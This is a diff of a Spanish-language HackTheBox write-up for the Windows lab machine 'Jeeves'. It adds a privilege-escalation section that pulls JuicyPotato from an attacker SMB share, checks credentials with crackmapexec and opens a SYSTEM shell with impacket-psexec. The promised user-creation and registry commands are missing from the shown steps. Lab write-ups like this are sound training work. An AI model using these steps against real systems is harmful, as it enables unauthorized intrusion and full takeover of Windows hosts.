@@ -1,8 +1,8 @@
 ---
 title: Jeeves | Windows
-published: 2025-10-22
+published: 2025-10-25
 image: "./logo.png"
-tags: [Medium, Windows, ]
+tags: [Medium, Windows, Jenkins Exploitation, JuicyPotato, SeImpersonatePrivilege, Breaking KeePass, Alternate Data Streams, OSCP, eJPT, eWPT,eCPPTv3]
 category: HackTheBox
 ---
 
@@ -11,7 +11,7 @@ category: HackTheBox
 ### Técnicas vistas
 
 - Jenkins Exploitation (Groovy Script Console)
-- RottenPotato (SeImpersonatePrivilege)
+- JuicyPotato (SeImpersonatePrivilege)
 - PassTheHash (Psexec)
 - Breaking KeePass
 - Alternate Data Streams (ADS)
@@ -324,13 +324,90 @@ afbc5bd4b615a6064...
 
 ## Escalada de privilegios (Second way)
 
+Si utilizamos el comando `whoami /priv` para ver los privilegios del usuario, vemos esto.¡:
+
+```bash wrap=false
+PS C:\windows\temp\privesc> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+```
+
+Vemos que tiene `SeImpersonatePrivilege`, por lo que podríamos usar el binario `JuicyPotato` para aprovecharnos de esto y escalar privilegios.
+
+### JuicyPotato
+
+Nos descargaremos el binario desde el [repositorio de Github](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) y nos lo pasaremos mediante `SMB` de la siguiente manera:
+
+```bash wrap=false
+PS C:\windows\temp\privesc> copy \\10.10.14.15\smbFolder\JuicyPotato.exe JP.exe
+PS C:\windows\temp\privesc> dir
 
 
+    Directory: C:\windows\temp\privesc
 
 
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       10/24/2025   6:23 PM         347648 JP.exe 
+
+PS C:\windows\temp\privesc> .\JP.exe
+JuicyPotato v0.1 
+
+Mandatory args: 
+-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
+-p <program>: program to launch
+-l <port>: COM server listen port
 
 
+Optional args: 
+-m <ip>: COM server listen address (default 127.0.0.1)
+-a <argument>: command line argument to pass to program (default NULL)
+-k <ip>: RPC server ip address (default 127.0.0.1)
+-n <port>: RPC server listen port (default 135)
+-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
+-z only test CLSID and print token's user
+```
 
-[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/442)
+Ahora nos crearemos un **usuario**, le añadiremos al grupo **Administrators** y cambiaremos el **registro** para habilitar el acceso administrativo remoto para cuentas de usuario local en el equipo, con los siguientes comandos:
+
+```bash wrap=false
+❯ crackmapexec smb 10.10.10.63 -u 'zelpro' -p 'zelpro123!$'                            
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.10.10.63     445    JEEVES           [+] Jeeves\zelpro:zelpro123!$ (Pwn3d!)
+```
+
+Vemos que lo hemos hecho bien, vamos a conectarnos con `impacket-psexec`:
+
+```bash wrap=false
+❯ impacket-psexec WORKGROUP/zelpro@10.10.10.63 cmd.exe                                 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on 10.10.10.63.....
+[*] Found writable share ADMIN$
+[*] Uploading file IoUctpBH.exe
+[*] Opening SVCManager on 10.10.10.63.....
+[*] Creating service IPkZ on 10.10.10.63.....
+[*] Starting service IPkZ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/114)
 
 ---
